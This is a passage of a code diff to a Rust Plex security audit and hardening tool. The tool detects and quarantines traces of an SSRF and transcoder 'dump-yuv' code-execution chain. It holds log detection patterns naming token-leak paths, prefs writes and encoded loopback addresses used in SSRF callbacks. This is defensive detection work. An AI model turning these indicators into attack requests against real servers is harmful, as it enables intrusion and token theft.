@@ -4,13 +4,15 @@ use plugin_toolkit::prelude::*;
 use tokio::process::Command;
 
 use crate::apt_repo::valid_target;
-use crate::lifecycle::Runtime;
-use crate::storage::{capture, guest};
+use crate::lifecycle::{self, PlexRestartArgs, Runtime};
+use crate::storage::{capture, guest, guest_as};
 
 pub const MIN_PATCHED_VERSION: &str = "1.42.2.10157";
 
 const DEFAULT_DATA_DIR: &str =
     "/var/lib/plexmediaserver/Library/Application Support/Plex Media Server";
+
+const MTIME_OUTLIER_SECS: f64 = 86_400.0;
 
 const REMOTE_PREFS: &[&str] = &[
     "PublishServerOnPlexOnlineKey",
@@ -18,16 +20,23 @@ const REMOTE_PREFS: &[&str] = &[
     "ManualPortMappingPort",
 ];
 
-const WAN_ONLY_IOCS: &[&str] = &["/player/proxy/poll", "/player/timeline/subscribe"];
-
-const IOCS: &[&str] = &[
-    "protocol=http%3A%2F%2F127.0.0.1",
-    "protocol=http://127.0.0.1",
-    "GetResultFromNetwork?url=",
+const GREP_PATTERNS: &[&str] = &[
+    "/player/proxy/poll",
+    "/player/timeline/subscribe",
+    "protocol=http",
+    "getresultfromnetwork",
     "/leak/",
     "plexscan-",
-    "PUT /:/prefs?Transcoder",
+    "tkn_",
+    "/:/prefs",
+    "dump-yuv",
+    "dump%2dyuv",
     "resources/x?resource_name=",
+];
+
+const FOLLOW_UPS: &[&str] = &[
+    "rotate the Plex owner token: sign out all devices at plex.tv (Account > Authorized Devices) and change the account password",
+    "restart Plex Media Server so no loaded attacker library survives in memory",
 ];
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
@@ -54,10 +63,29 @@ pub struct SecurityFinding {
 #[serde(rename_all = "camelCase")]
 pub struct LogIoc {
     pub indicator: String,
+    pub severity: Severity,
     pub timestamp: Option<String>,
     pub source_ip: Option<String>,
     pub wan: bool,
     pub line: String,
+}
+
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize, JsonSchema)]
+#[schemars(crate = "plugin_toolkit::schemars")]
+#[serde(rename_all = "camelCase")]
+pub struct CodecEntry {
+    pub path: String,
+    pub mtime: f64,
+    pub symlink: bool,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
+#[schemars(crate = "plugin_toolkit::schemars")]
+#[serde(rename_all = "camelCase")]
+pub struct CodecSuspect {
+    pub path: String,
+    pub reasons: Vec<String>,
+    pub quarantinable: bool,
 }
 
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
@@ -66,11 +94,13 @@ pub struct LogIoc {
 pub struct PlexSecurityAuditReport {
     pub version: Option<String>,
     pub min_patched_version: String,
+    pub complete: bool,
     pub clean: bool,
     pub findings: Vec<SecurityFinding>,
     pub remote_exposure: Vec<(String, String)>,
-    pub foreign_codecs: Vec<String>,
+    pub codec_suspects: Vec<CodecSuspect>,
     pub log_iocs: Vec<LogIoc>,
+    pub follow_ups: Vec<String>,
 }
 
 fn finding(kind: &str, severity: Severity, detail: impl Into<String>) -> SecurityFinding {
@@ -94,13 +124,33 @@ pub fn version_below(version: &str, minimum: &str) -> bool {
     parse_version(version) < parse_version(minimum)
 }
 
-pub fn suspicious_transcoder_prefs(prefs: &[(String, String)]) -> Vec<(String, String)> {
+fn is_transcoder_options(id: &str) -> bool {
+    id.starts_with("Transcoder") && id.ends_with("Options")
+}
+
+fn value_is_suspicious(value: &str) -> bool {
+    let v = value.to_ascii_lowercase();
+    v.contains("dump-yuv") || v.contains(".so") || v.contains("/codecs/")
+}
+
+pub fn suspicious_prefs(prefs: &[(String, String)]) -> Vec<(String, String)> {
     prefs
         .iter()
         .filter(|(id, v)| {
-            id.starts_with("Transcoder") && id.ends_with("Options") && !v.trim().is_empty()
+            !v.trim().is_empty() && (is_transcoder_options(id) || value_is_suspicious(v))
         })
         .cloned()
+        .collect()
+}
+
+pub fn prefs_to_clear(prefs: &[(String, String)]) -> Vec<String> {
+    prefs
+        .iter()
+        .filter(|(id, v)| {
+            !v.trim().is_empty()
+                && (is_transcoder_options(id) || v.to_ascii_lowercase().contains("dump-yuv"))
+        })
+        .map(|(id, _)| id.clone())
         .collect()
 }
 
@@ -114,57 +164,206 @@ pub fn is_shipped_codec(name: &str) -> bool {
     !stem.is_empty() && stem.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_')
 }
 
-pub fn foreign_codecs(paths: &[String]) -> Vec<String> {
-    paths
-        .iter()
-        .filter(|p| {
-            let mut parts = p.rsplit('/');
-            let name = parts.next().unwrap_or("");
-            let dir = parts.next().unwrap_or("");
-            dir.contains("-linux-") && !is_shipped_codec(name)
+pub fn parse_find_output(out: &str) -> Vec<CodecEntry> {
+    out.split('\0')
+        .filter(|r| !r.is_empty())
+        .filter_map(|r| {
+            let r = r.strip_prefix('\n').unwrap_or(r);
+            let (mtime, rest) = r.split_once(' ')?;
+            let (kind, path) = rest.split_once(' ')?;
+            Some(CodecEntry {
+                path: path.to_string(),
+                mtime: mtime.parse().ok()?,
+                symlink: kind == "l",
+            })
         })
-        .cloned()
         .collect()
 }
 
-pub fn scrub_tokens(line: &str) -> String {
-    let scrubbed = plugin_toolkit::logging::scrub(line).into_owned();
-    let lower = scrubbed.to_ascii_lowercase();
-    let mut out = String::with_capacity(scrubbed.len());
-    let mut i = 0;
-    while let Some(off) = lower[i..].find("x-plex-token") {
-        let key_end = i + off + "x-plex-token".len();
-        let mut v = key_end;
-        let bytes = scrubbed.as_bytes();
-        while v < bytes.len() && matches!(bytes[v], b'=' | b':' | b' ' | b'"') {
-            v += 1;
+fn parent_of(path: &str) -> &str {
+    path.rsplit_once('/').map(|(d, _)| d).unwrap_or("")
+}
+
+fn median(mut v: Vec<f64>) -> f64 {
+    v.sort_by(|a, b| a.total_cmp(b));
+    v[v.len() / 2]
+}
+
+pub fn classify_codecs(
+    codecs_dir: &str,
+    entries: &[CodecEntry],
+    prefs: &[(String, String)],
+) -> Vec<CodecSuspect> {
+    let root = format!("{}/", codecs_dir.trim_end_matches('/'));
+    let pref_values: Vec<String> = prefs
+        .iter()
+        .filter(|(_, v)| !v.trim().is_empty())
+        .map(|(_, v)| v.clone())
+        .collect();
+    let mut out = Vec::new();
+    for e in entries {
+        let Some(rel) = e.path.strip_prefix(&root) else {
+            continue;
+        };
+        let parts: Vec<&str> = rel.split('/').collect();
+        let name = parts.last().copied().unwrap_or("");
+        let protected = parts.len() == 1
+            && (name == ".device-id"
+                || (name.starts_with("EasyAudioEncoder-")
+                    && name.contains("-linux-")
+                    && name.ends_with(".zip")));
+        let in_eae = parts.len() > 1 && parts[0].starts_with("EasyAudioEncoder-");
+        let mut reasons = Vec::new();
+        if e.symlink {
+            reasons.push("symlink".to_string());
         }
-        let mut end = v;
-        while end < bytes.len() && !matches!(bytes[end], b'&' | b' ' | b'"' | b'\'' | b'#' | b']') {
-            end += 1;
+        let name_ok = protected
+            || in_eae
+            || (parts.len() == 2 && parts[0].contains("-linux-") && is_shipped_codec(name));
+        if !name_ok {
+            reasons.push("unexpected name or location".to_string());
         }
-        out.push_str(&scrubbed[i..v]);
-        if end > v && &scrubbed[v..end] != "***" {
-            out.push_str("***");
-        } else {
-            out.push_str(&scrubbed[v..end]);
+        if pref_values
+            .iter()
+            .any(|v| v.contains(&e.path) || v.contains(&format!("/{name}")))
+        {
+            reasons.push("referenced by a pref value".to_string());
         }
-        i = end;
+        let parent = parent_of(&e.path);
+        let siblings: Vec<f64> = entries
+            .iter()
+            .filter(|s| parent_of(&s.path) == parent)
+            .map(|s| s.mtime)
+            .collect();
+        if siblings.len() >= 3 && (e.mtime - median(siblings)).abs() > MTIME_OUTLIER_SECS {
+            reasons.push("mtime differs from sibling majority".to_string());
+        }
+        if !reasons.is_empty() {
+            out.push(CodecSuspect {
+                path: e.path.clone(),
+                reasons,
+                quarantinable: !protected,
+            });
+        }
     }
-    out.push_str(&scrubbed[i..]);
     out
 }
 
-fn is_private_ip(ip: &str) -> bool {
-    match ip.parse::<std::net::IpAddr>() {
-        Ok(std::net::IpAddr::V4(a)) => a.is_private() || a.is_loopback() || a.is_link_local(),
-        Ok(std::net::IpAddr::V6(a)) => {
-            a.is_loopback()
-                || (a.segments()[0] & 0xfe00) == 0xfc00
-                || (a.segments()[0] & 0xffc0) == 0xfe80
+fn redact_value(out: &mut String, s: &str, start: usize, stop: fn(u8) -> bool) -> usize {
+    let bytes = s.as_bytes();
+    let mut end = start;
+    while end < bytes.len() && !stop(bytes[end]) {
+        end += 1;
+    }
+    if end > start {
+        out.push_str("***");
+    }
+    end
+}
+
+fn url_stop(b: u8) -> bool {
+    matches!(b, b'&' | b' ' | b'"' | b'\'' | b']' | b'#')
+}
+
+fn segment_stop(b: u8) -> bool {
+    matches!(b, b'/' | b'&' | b'?' | b' ' | b'"' | b'\'' | b'#' | b']')
+}
+
+fn param_stop(b: u8) -> bool {
+    matches!(b, b'&' | b' ' | b'"' | b'\'' | b'#' | b']' | b',' | b';')
+}
+
+fn ident_byte(b: u8) -> bool {
+    b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-')
+}
+
+pub fn scrub_tokens(line: &str) -> String {
+    let s = plugin_toolkit::logging::scrub(line).into_owned();
+    let lower = s.to_ascii_lowercase();
+    let bytes = s.as_bytes();
+    let mut out = String::with_capacity(s.len());
+    let mut i = 0;
+    while i < bytes.len() {
+        let rest = &lower[i..];
+        if rest.starts_with("getresultfromnetwork?url=") {
+            let v = i + "getresultfromnetwork?url=".len();
+            out.push_str(&s[i..v]);
+            i = redact_value(&mut out, &s, v, url_stop);
+            continue;
         }
+        if rest.starts_with("/leak/") {
+            out.push_str(&s[i..i + 6]);
+            i = redact_value(&mut out, &s, i + 6, segment_stop);
+            continue;
+        }
+        if rest.starts_with("tkn_") && (i == 0 || !ident_byte(bytes[i - 1])) {
+            out.push_str(&s[i..i + 4]);
+            i = redact_value(&mut out, &s, i + 4, |b| !b.is_ascii_alphanumeric());
+            continue;
+        }
+        if ident_byte(bytes[i]) && (i == 0 || !ident_byte(bytes[i - 1])) {
+            let mut end = i;
+            while end < bytes.len() && ident_byte(bytes[end]) {
+                end += 1;
+            }
+            let mut v = end;
+            while v < bytes.len() && matches!(bytes[v], b' ' | b'"') {
+                v += 1;
+            }
+            if lower[i..end].contains("token") && v < bytes.len() && matches!(bytes[v], b'=' | b':')
+            {
+                v += 1;
+                while v < bytes.len() && matches!(bytes[v], b' ' | b'"') {
+                    v += 1;
+                }
+                out.push_str(&s[i..v]);
+                if s[v..].starts_with("***") {
+                    i = v;
+                } else {
+                    i = redact_value(&mut out, &s, v, param_stop);
+                }
+                continue;
+            }
+            out.push_str(&s[i..end]);
+            i = end;
+            continue;
+        }
+        let ch = s[i..].chars().next().unwrap_or('\0');
+        out.push(ch);
+        i += ch.len_utf8().max(1);
+    }
+    out
+}
+
+fn is_non_wan_ip(ip: &str) -> bool {
+    match ip.parse::<std::net::IpAddr>() {
+        Ok(std::net::IpAddr::V4(a)) => {
+            let o = a.octets();
+            a.is_private()
+                || a.is_loopback()
+                || a.is_link_local()
+                || (o[0] == 100 && (o[1] & 0xc0) == 64)
+        }
+        Ok(std::net::IpAddr::V6(a)) => match a.to_ipv4_mapped() {
+            Some(v4) => is_non_wan_ip(&v4.to_string()),
+            None => {
+                a.is_loopback()
+                    || (a.segments()[0] & 0xfe00) == 0xfc00
+                    || (a.segments()[0] & 0xffc0) == 0xfe80
+            }
+        },
         Err(_) => false,
     }
+}
+
+fn split_addr(addr: &str) -> String {
+    if let Some(rest) = addr.strip_prefix('[') {
+        return rest.split(']').next().unwrap_or(rest).to_string();
+    }
+    if addr.matches(':').count() == 1 {
+        return addr.split(':').next().unwrap_or(addr).to_string();
+    }
+    addr.to_string()
 }
 
 fn client_of(line: &str) -> (Option<String>, Option<bool>) {
@@ -172,40 +371,105 @@ fn client_of(line: &str) -> (Option<String>, Option<bool>) {
         return (None, None);
     };
     let rest = &line[start + "Request: [".len()..];
-    let Some(close) = rest.find(']') else {
-        return (None, None);
-    };
-    let inner = &rest[..close];
-    let (addr, tag) = match inner.split_once(" (") {
+    let segment = rest
+        .split("] ")
+        .next()
+        .unwrap_or(rest)
+        .trim_end_matches(']');
+    let (inner, tag) = match segment.split_once(" (") {
         Some((a, t)) => (a, Some(t.trim_end_matches(')'))),
-        None => (inner, None),
+        None => (segment, None),
     };
-    let ip = addr
-        .rsplit_once(':')
-        .map(|(ip, _)| ip)
-        .unwrap_or(addr)
-        .trim_matches(['[', ']'])
-        .to_string();
+    let ip = split_addr(inner);
     let wan = match tag {
-        Some(t) => Some(t.eq_ignore_ascii_case("WAN")),
-        None => Some(!is_private_ip(&ip)),
+        Some(t) => t.eq_ignore_ascii_case("WAN"),
+        None => !is_non_wan_ip(&ip),
     };
-    (Some(ip), wan)
+    (Some(ip), Some(wan))
+}
+
+fn protocol_targets_loopback(lower: &str) -> bool {
+    let Some(p) = lower.find("protocol=") else {
+        return false;
+    };
+    let v = lower[p + "protocol=".len()..]
+        .replace("%3a", ":")
+        .replace("%2f", "/")
+        .replace("%5b", "[")
+        .replace("%5d", "]");
+    let host = v
+        .split("://")
+        .nth(1)
+        .unwrap_or("")
+        .split(['/', '?', '&', ' '])
+        .next()
+        .unwrap_or("");
+    let bare = host.trim_start_matches('[');
+    bare.starts_with("localhost")
+        || bare.starts_with("127.")
+        || bare.starts_with("0.0.0.0")
+        || bare.starts_with("0:")
+        || bare.starts_with("::1]")
+        || bare.starts_with("::ffff:127.")
+        || bare.starts_with("::ffff:7f")
+        || bare.starts_with("2130706433")
+        || bare.starts_with("0x7f")
+        || bare.starts_with("017")
+}
+
+fn classify_line(lower: &str, wan: bool) -> Option<(&'static str, Severity)> {
+    let crit = Severity::Critical;
+    if lower.contains("/player/timeline/subscribe") && lower.contains("protocol=http") {
+        if wan || protocol_targets_loopback(lower) {
+            return Some(("timeline_subscribe_callback", crit));
+        }
+        return Some(("timeline_subscribe_callback", Severity::Warning));
+    }
+    if lower.contains("getresultfromnetwork") {
+        return Some(("get_result_from_network", crit));
+    }
+    if lower.contains("/leak/") {
+        return Some(("leak_path", crit));
+    }
+    if lower.contains("plexscan-") {
+        return Some(("plexscan_player", crit));
+    }
+    if lower.contains("tkn_") {
+        return Some(("tkn_marker", crit));
+    }
+    if lower.contains("put /:/prefs")
+        && (lower.contains("dump-yuv")
+            || lower.contains("dump%2dyuv")
+            || (lower.contains("transcoder") && lower.contains("options=")))
+    {
+        return Some(("transcoder_pref_write", crit));
+    }
+    if lower.contains("resources/x?resource_name=") {
+        return Some(("resource_read", crit));
+    }
+    if lower.contains("dump-yuv") || lower.contains("dump%2dyuv") {
+        return Some(("dump_yuv", crit));
+    }
+    if lower.contains("/player/proxy/poll") || lower.contains("/player/timeline/subscribe") {
+        return Some((
+            "companion_player",
+            if wan { crit } else { Severity::Warning },
+        ));
+    }
+    None
 }
 
 pub fn parse_ioc_line(line: &str) -> Option<LogIoc> {
     let (ip, wan) = client_of(line);
     let wan = wan.unwrap_or(false);
-    let indicator = IOCS
-        .iter()
-        .find(|p| line.contains(*p))
-        .or_else(|| WAN_ONLY_IOCS.iter().find(|p| wan && line.contains(*p)))?;
+    let (indicator, severity) = classify_line(&line.to_ascii_lowercase(), wan)?;
     let timestamp = line
         .split_once(" [")
         .map(|(t, _)| t.trim().to_string())
         .filter(|t| !t.is_empty());
     Some(LogIoc {
         indicator: indicator.to_string(),
+        severity,
         timestamp,
         source_ip: ip,
         wan,
@@ -217,50 +481,107 @@ pub fn parse_iocs(out: &str) -> Vec<LogIoc> {
     out.lines().filter_map(parse_ioc_line).collect()
 }
 
-async fn capture_lenient(mut cmd: Command) -> Result<(bool, String)> {
+fn has_control(s: &str) -> bool {
+    s.chars().any(char::is_control)
+}
+
+fn has_dotdot(s: &str) -> bool {
+    s.split('/').any(|seg| seg == "..")
+}
+
+pub fn valid_data_dir(dir: &str) -> bool {
+    dir.starts_with('/') && !has_dotdot(dir) && !has_control(dir)
+}
+
+pub fn safe_codec_path(data_dir: &str, path: &str) -> bool {
+    path.starts_with(&format!("{}/Codecs/", data_dir.trim_end_matches('/')))
+        && !has_dotdot(path)
+        && !has_control(path)
+}
+
+pub fn quarantine_path(quarantine_dir: &str, file: &str, stamp: &str) -> String {
+    let mut parts = file.rsplit('/');
+    let name = parts.next().unwrap_or("");
+    let dir = parts.next().unwrap_or("");
+    format!("{quarantine_dir}/{dir}__{name}.{stamp}.quarantined")
+}
+
+async fn output_of(mut cmd: Command) -> Result<(Option<i32>, String)> {
     let out = cmd
         .output()
         .await
         .context("failed to spawn guest command")?;
     Ok((
-        out.status.code().is_some_and(|c| c <= 1),
+        out.status.code(),
         String::from_utf8_lossy(&out.stdout).into_owned(),
     ))
 }
 
-async fn list_codec_files(runtime: Runtime, target: &str, data_dir: &str) -> Result<Vec<String>> {
+async fn list_codec_entries(
+    runtime: Runtime,
+    target: &str,
+    data_dir: &str,
+) -> Result<Vec<CodecEntry>> {
     let mut cmd = guest(runtime, target);
     cmd.arg("find")
         .arg(format!("{data_dir}/Codecs"))
         .arg("-mindepth")
-        .arg("2")
+        .arg("1")
         .arg("-maxdepth")
-        .arg("2")
-        .arg("-path")
-        .arg("*-linux-*/*")
+        .arg("4")
+        .arg("(")
         .arg("-type")
-        .arg("f");
+        .arg("f")
+        .arg("-o")
+        .arg("-type")
+        .arg("l")
+        .arg(")")
+        .arg("-printf")
+        .arg("%T@ %y %p\\0");
     let out = capture(cmd).await.context("list Codecs directory")?;
-    Ok(out
-        .lines()
-        .map(str::trim)
-        .filter(|l| !l.is_empty())
-        .map(str::to_string)
-        .collect())
+    Ok(parse_find_output(&out))
 }
 
-async fn scan_logs(runtime: Runtime, target: &str, data_dir: &str) -> Result<(bool, String)> {
+async fn scan_logs(runtime: Runtime, target: &str, data_dir: &str) -> Result<Option<String>> {
+    let mut find = guest(runtime, target);
+    find.arg("find")
+        .arg(format!("{data_dir}/Logs"))
+        .arg("-maxdepth")
+        .arg("1")
+        .arg("-type")
+        .arg("f")
+        .arg("-name")
+        .arg("Plex*.log")
+        .arg("-print0");
+    let listed = capture(find).await.context("list Plex logs")?;
+    let logs: Vec<&str> = listed.split('\0').filter(|p| !p.is_empty()).collect();
+    if logs.is_empty() {
+        return Ok(None);
+    }
     let mut cmd = guest(runtime, target);
-    cmd.arg("grep").arg("-h").arg("-s").arg("-F");
-    for p in IOCS.iter().chain(WAN_ONLY_IOCS) {
+    cmd.arg("grep").arg("-h").arg("-s").arg("-i").arg("-F");
+    for p in GREP_PATTERNS {
         cmd.arg("-e").arg(p);
     }
-    cmd.arg("--")
-        .arg(format!("{data_dir}/Logs/Plex Media Server.log"));
-    for n in 1..=5 {
-        cmd.arg(format!("{data_dir}/Logs/Plex Media Server.{n}.log"));
+    cmd.arg("--").args(&logs);
+    let (code, out) = output_of(cmd).await?;
+    match code {
+        Some(0 | 1) => Ok(Some(out)),
+        Some(2) if !out.is_empty() => Ok(Some(out)),
+        _ => Ok(None),
     }
-    capture_lenient(cmd).await
+}
+
+fn checked(runtime: Runtime, target: Option<&str>, data_dir: &str) -> Result<()> {
+    if !valid_data_dir(data_dir) {
+        bail!("data_dir must be an absolute path without '..': {data_dir:?}");
+    }
+    if let Some(t) = target {
+        if !valid_target(runtime, t) {
+            bail!("invalid target {t:?}");
+        }
+    }
+    Ok(())
 }
 
 #[derive(clap::Args, Serialize, Deserialize, JsonSchema)]
@@ -276,7 +597,7 @@ pub struct PlexSecurityAuditArgs {
     #[arg(long)]
     #[serde(default)]
     pub target: Option<String>,
-    /// Plex data directory inside the guest.
+    /// Absolute Plex data directory inside the guest.
     #[arg(long, default_value_t = default_data_dir())]
     #[serde(default = "default_data_dir")]
     pub data_dir: String,
@@ -286,16 +607,13 @@ fn default_data_dir() -> String {
     DEFAULT_DATA_DIR.to_string()
 }
 
-fn checked_target(runtime: Runtime, target: Option<&str>) -> Result<Option<&str>> {
-    match target {
-        Some(t) if !valid_target(runtime, t) => bail!("invalid target {t:?}"),
-        other => Ok(other),
-    }
+fn default_run_as() -> String {
+    "plex".to_string()
 }
 
 async fn audit(args: &PlexSecurityAuditArgs) -> Result<PlexSecurityAuditReport> {
+    checked(args.runtime, args.target.as_deref(), &args.data_dir)?;
     let client = crate::tools::make_client(&args.endpoint)?;
-    let target = checked_target(args.runtime, args.target.as_deref())?;
     let mut findings = Vec::new();
 
     let version = client.identity_version().await.context("read /identity")?;
@@ -303,9 +621,15 @@ async fn audit(args: &PlexSecurityAuditArgs) -> Result<PlexSecurityAuditReport> 
         Some(v) if version_below(v, MIN_PATCHED_VERSION) => findings.push(finding(
             "version_unpatched",
             Severity::Critical,
-            format!("server {v} is below minimum patched {MIN_PATCHED_VERSION}"),
+            format!(
+                "server {v} is below {MIN_PATCHED_VERSION} (unverified threshold: the next build after the exploited 1.42.2.10156)"
+            ),
         )),
-        Some(v) => findings.push(finding("version", Severity::Info, format!("server {v}"))),
+        Some(v) => findings.push(finding(
+            "version",
+            Severity::Info,
+            format!("server {v}; threshold {MIN_PATCHED_VERSION} is unverified"),
+        )),
         None => findings.push(finding(
             "version",
             Severity::Unchecked,
@@ -314,9 +638,9 @@ async fn audit(args: &PlexSecurityAuditArgs) -> Result<PlexSecurityAuditReport> 
     }
 
     let prefs = client.prefs().await.context("read /:/prefs")?;
-    for (id, value) in suspicious_transcoder_prefs(&prefs) {
+    for (id, value) in suspicious_prefs(&prefs) {
         findings.push(finding(
-            "transcoder_options_set",
+            "suspicious_pref",
             Severity::Critical,
             format!("{id} = {}", scrub_tokens(&value)),
         ));
@@ -337,60 +661,77 @@ async fn audit(args: &PlexSecurityAuditArgs) -> Result<PlexSecurityAuditReport> 
         ));
     }
 
-    let mut foreign = Vec::new();
+    let mut codec_suspects = Vec::new();
     let mut log_iocs = Vec::new();
-    match target {
+    match args.target.as_deref() {
         None => {
             findings.push(finding("codecs", Severity::Unchecked, "no target given"));
             findings.push(finding("logs", Severity::Unchecked, "no target given"));
         }
         Some(t) => {
-            match list_codec_files(args.runtime, t, &args.data_dir).await {
-                Ok(files) => {
-                    foreign = foreign_codecs(&files);
-                    for f in &foreign {
-                        findings.push(finding("foreign_codec", Severity::Critical, f.clone()));
+            let codecs_dir = format!("{}/Codecs", args.data_dir);
+            match list_codec_entries(args.runtime, t, &args.data_dir).await {
+                Ok(entries) => {
+                    codec_suspects = classify_codecs(&codecs_dir, &entries, &prefs);
+                    for s in &codec_suspects {
+                        findings.push(finding(
+                            "codec_suspect",
+                            Severity::Critical,
+                            format!("{} ({})", s.path, s.reasons.join(", ")),
+                        ));
                     }
                 }
                 Err(e) => findings.push(finding("codecs", Severity::Unchecked, format!("{e:#}"))),
             }
             match scan_logs(args.runtime, t, &args.data_dir).await {
-                Ok((true, out)) => {
+                Ok(Some(out)) => {
                     log_iocs = parse_iocs(&out);
-                    if !log_iocs.is_empty() {
-                        findings.push(finding(
-                            "log_iocs",
-                            Severity::Critical,
-                            format!("{} exploit indicators in Plex logs", log_iocs.len()),
-                        ));
+                    for sev in [Severity::Critical, Severity::Warning] {
+                        let n = log_iocs.iter().filter(|i| i.severity == sev).count();
+                        if n > 0 {
+                            findings.push(finding(
+                                "log_iocs",
+                                sev,
+                                format!("{n} exploit indicators in Plex logs"),
+                            ));
+                        }
                     }
                 }
-                Ok((false, _)) => findings.push(finding(
+                Ok(None) => findings.push(finding(
                     "logs",
                     Severity::Unchecked,
-                    "Plex Media Server logs not readable",
+                    "Plex logs not found or not readable",
                 )),
                 Err(e) => findings.push(finding("logs", Severity::Unchecked, format!("{e:#}"))),
             }
         }
     }
 
-    let clean = !findings
-        .iter()
-        .any(|f| matches!(f.severity, Severity::Critical | Severity::Warning));
+    let complete = !findings.iter().any(|f| f.severity == Severity::Unchecked);
+    let clean = complete
+        && !findings
+            .iter()
+            .any(|f| matches!(f.severity, Severity::Critical | Severity::Warning));
+    let compromised = findings.iter().any(|f| f.severity == Severity::Critical);
     Ok(PlexSecurityAuditReport {
         version,
         min_patched_version: MIN_PATCHED_VERSION.to_string(),
+        complete,
         clean,
         findings,
         remote_exposure,
-        foreign_codecs: foreign,
+        codec_suspects,
         log_iocs,
+        follow_ups: if compromised {
+            FOLLOW_UPS.iter().map(|s| s.to_string()).collect()
+        } else {
+            Vec::new()
+        },
     })
 }
 
 /// **Audit a Plex server** for the companion-proxy SSRF / transcoder `dump-yuv`
-/// RCE chain: version, Transcoder*Options prefs, foreign Codecs libraries, log
+/// RCE chain: version, suspicious prefs, Codecs directory tampering, log
 /// indicators, and remote exposure. Read-only.
 #[orca_tool(domain = "plex", verb = "security_audit", role = "admin")]
 async fn plex_security_audit(
@@ -409,18 +750,42 @@ pub struct PlexSecurityHardenArgs {
     #[arg(long, value_enum, default_value_t = Runtime::Lxc)]
     #[serde(default)]
     pub runtime: Runtime,
-    /// LXC vmid or docker container name/id; required to quarantine Codecs files.
+    /// LXC vmid or docker container name/id; required for quarantine, kill and restart.
     #[arg(long)]
     #[serde(default)]
     pub target: Option<String>,
-    /// Plex data directory inside the guest.
+    /// Absolute Plex data directory inside the guest.
     #[arg(long, default_value_t = default_data_dir())]
     #[serde(default = "default_data_dir")]
     pub data_dir: String,
+    /// Guest user that owns the Plex data directory; quarantine runs as it.
+    #[arg(long, default_value_t = default_run_as())]
+    #[serde(default = "default_run_as")]
+    pub run_as: String,
     /// Also set PublishServerOnPlexOnlineKey=0.
     #[arg(long)]
     #[serde(default)]
     pub disable_remote: bool,
+    /// Kill running `Plex Transcoder` processes.
+    #[arg(long)]
+    #[serde(default)]
+    pub kill_transcoders: bool,
+    /// Restart Plex Media Server afterwards.
+    #[arg(long)]
+    #[serde(default)]
+    pub restart: bool,
+}
+
+#[derive(Debug, Serialize, Deserialize, JsonSchema)]
+#[schemars(crate = "plugin_toolkit::schemars")]
+#[serde(rename_all = "camelCase")]
+pub struct QuarantineResult {
+    pub source: String,
+    pub dest: String,
+    pub reasons: Vec<String>,
+    pub moved: bool,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub error: Option<String>,
 }
 
 #[derive(Debug, Serialize, Deserialize, JsonSchema)]
@@ -429,24 +794,40 @@ pub struct PlexSecurityHardenArgs {
 pub struct PlexSecurityHardenOutput {
     pub dry_run: bool,
     pub cleared_prefs: Vec<String>,
-    pub quarantined: Vec<(String, String)>,
     pub remote_disabled: bool,
+    pub remote_disable_planned: bool,
+    pub quarantine: Vec<QuarantineResult>,
+    pub transcoders_killed: bool,
+    pub restarted: bool,
+    pub errors: Vec<String>,
+    pub follow_ups: Vec<String>,
 }
 
-pub fn quarantine_path(quarantine_dir: &str, file: &str, stamp: &str) -> String {
-    let mut parts = file.rsplit('/');
-    let name = parts.next().unwrap_or("");
-    let dir = parts.next().unwrap_or("");
-    format!("{quarantine_dir}/{dir}__{name}.{stamp}")
+async fn quarantine_one(
+    runtime: Runtime,
+    target: &str,
+    user: &str,
+    src: &str,
+    dest: &str,
+) -> Result<()> {
+    let mut mv = guest_as(runtime, target, user);
+    mv.arg("mv").arg("-n").arg("--").arg(src).arg(dest);
+    capture(mv).await?;
+    let mut chmod = guest_as(runtime, target, user);
+    chmod.arg("chmod").arg("000").arg("--").arg(dest);
+    capture(chmod).await?;
+    Ok(())
 }
 
 /// **Harden a Plex server** against the companion-proxy SSRF / transcoder
-/// `dump-yuv` RCE chain: clears non-empty Transcoder*Options prefs, moves
-/// foreign Codecs files to a quarantine dir, optionally disables remote
-/// publishing. `dryRun` reports the plan without changing anything.
+/// `dump-yuv` RCE chain. DESTRUCTIVE: clears malicious Transcoder prefs,
+/// moves suspect Codecs files into a quarantine dir (chmod 000, never
+/// deleted), and can disable remote publishing, kill transcoders and restart
+/// Plex. `dryRun` reports the plan without changing anything.
 #[orca_tool(
     domain = "plex",
     verb = "security_harden",
+    title = "Harden Plex (destructive)",
     role = "admin",
     execute_gated = false,
     dry_run_aware = true
@@ -456,61 +837,126 @@ async fn plex_security_harden(
     ctx: &ToolCtx,
 ) -> Result<PlexSecurityHardenOutput> {
     let dry_run = ctx.dry_run();
+    checked(args.runtime, args.target.as_deref(), &args.data_dir)?;
+    if !args
+        .run_as
+        .bytes()
+        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-'))
+    {
+        bail!("invalid run_as {:?}", args.run_as);
+    }
     let client = crate::tools::make_client(&args.endpoint)?;
-    let target = checked_target(args.runtime, args.target.as_deref())?;
+    let mut errors = Vec::new();
 
     let prefs = client.prefs().await.context("read /:/prefs")?;
-    let cleared_prefs: Vec<String> = suspicious_transcoder_prefs(&prefs)
-        .into_iter()
-        .map(|(id, _)| id)
-        .collect();
-
-    let mut quarantined = Vec::new();
-    if let Some(t) = target {
-        let files = list_codec_files(args.runtime, t, &args.data_dir).await?;
-        let qdir = format!("{}/Codecs.quarantine", args.data_dir);
-        let stamp = plugin_toolkit::time::Timestamp::now().compact();
-        quarantined = foreign_codecs(&files)
-            .into_iter()
-            .map(|f| {
-                let dest = quarantine_path(&qdir, &f, &stamp);
-                (f, dest)
-            })
-            .collect();
-        if !dry_run && !quarantined.is_empty() {
-            let mut mk = guest(args.runtime, t);
-            mk.arg("mkdir").arg("-p").arg(&qdir);
-            capture(mk).await.context("create quarantine dir")?;
-            for (src, dest) in &quarantined {
-                let mut mv = guest(args.runtime, t);
-                mv.arg("mv").arg("-n").arg("--").arg(src).arg(dest);
-                capture(mv)
-                    .await
-                    .with_context(|| format!("quarantine {src}"))?;
-            }
+    let mut cleared_prefs = Vec::new();
+    for id in prefs_to_clear(&prefs) {
+        if dry_run {
+            cleared_prefs.push(id);
+            continue;
+        }
+        match client.set_pref(&id, "").await {
+            Ok(()) => cleared_prefs.push(id),
